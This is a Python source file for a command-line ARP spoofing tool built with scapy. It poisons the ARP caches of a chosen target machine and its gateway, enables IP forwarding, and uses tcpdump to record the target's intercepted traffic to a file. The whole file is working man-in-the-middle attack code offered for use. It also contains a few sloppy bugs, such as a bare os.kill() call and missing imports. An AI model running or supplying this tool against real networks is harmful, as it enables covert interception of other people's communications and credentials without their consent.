
from scapy.all import *
from getmac import get_mac_address
import subprocess as sub
import os, sys, threading, signal

LOGO = """

ARP Spoofing tool made by memset-0x00

 $$$$$$\  $$$$$$$\  $$$$$$$\ $$\     $$\ 
$$  __$$\ $$  __$$\ $$  __$$\\$$\   $$  |
$$ /  $$ |$$ |  $$ |$$ |  $$ |\$$\ $$  / 
$$$$$$$$ |$$$$$$$  |$$$$$$$  | \$$$$  /  
$$  __$$ |$$  __$$< $$  ____/   \$$  /   
$$ |  $$ |$$ |  $$ |$$ |         $$ |    
$$ |  $$ |$$ |  $$ |$$ |         $$ |    
\__|  \__|\__|  \__|\__|         \__|

"""

def help():
    print("%s\narpy [iface] [target] [gateway] [outfile]\ne.g arpy wlp4s0 192.168.1.100 192.168.1.1 out" % LOGO)
    sys.exit(0)

def restore(gateway_ip, gateway_mac, target_ip, target_mac):
    # resetting arp cache of gateway and target machine
    # by sending arp packets to the broadcast addr (ff:ff:ff:ff:ff:ff)
    
    print("[!] Restoring gateway and target hwaddr...")

    send(ARP(op=2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
    send(ARP(op=2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    
    try: os.kill()

    except: pass

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
    # forward ipv4 traffic
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Enabled IP forwarding")
          
    # (opcode = 2) = ARP REPLY
    poison_target = ARP()
    
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[+] Starting ARP poisoning on %s (CTRL+C to stop)" % interface)
    
    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(0.5)
            
        except KeyboardInterrupt: 
            print("[!] KeyboardInterrupt exception")
            restore(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[!] ARP poisoning terminated")
    sys.exit(0)
    
def main(interf, targip, gatewy, outfile):
    # setting interface and disabling verbose
    conf.iface = interf
    conf.verb = 0
    print("[+] Setting up %s " % interf)

    # gathering mac addr
    gatewy_mac = get_mac_address(ip=gatewy)
    target_mac = get_mac_address(ip=targip)

    if gatewy_mac == '00:00:00:00:00:00' or target_mac == '00:00:00:00:00:00':
        print("[!] Unable to resolve mac addr, exiting")
        sys.exit(0)

    else: print("[+] Gateway = %s && Target = %s" % (gatewy_mac,target_mac))

    # starting arp poisoning
    poison_t = threading.Thread(target = poison_target, args = (gatewy, gatewy_mac, targip, target_mac, interf))
    poison_t.start()
    
    # beginning sniffing process
    try:
        p = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-A','-w', outfile, '--print'), stdout=sub.PIPE)
        for row in iter(p.stdout.readline, b''): print(row.rstrip())  # iter() to make an iteration

    except KeyboardInterrupt:
        restore(gatewy, gatewy_mac, targip, target_mac)
        sys.exit(0)

if __name__ == "__main__":
    # e.g sudo python3 arpy.py wlp4s0 192.168.1.179 192.168.1.1 out
    try:
        interface = sys.argv[1]
        if interface.lower() == "help" or interface.lower() == "--help" or interface.lower() == "-help": help()
        target_ip = sys.argv[2]
        gatewy_ip = sys.argv[3]
        output_fl = sys.argv[4]

        ls_dir = subprocess.check_output(['ls'])

        if output_fl in str(ls_dir): print("[!] Output file already exists")
        else: main(interface, target_ip, gatewy_ip, output_fl)
    
    except Exception as err: print(err)
     
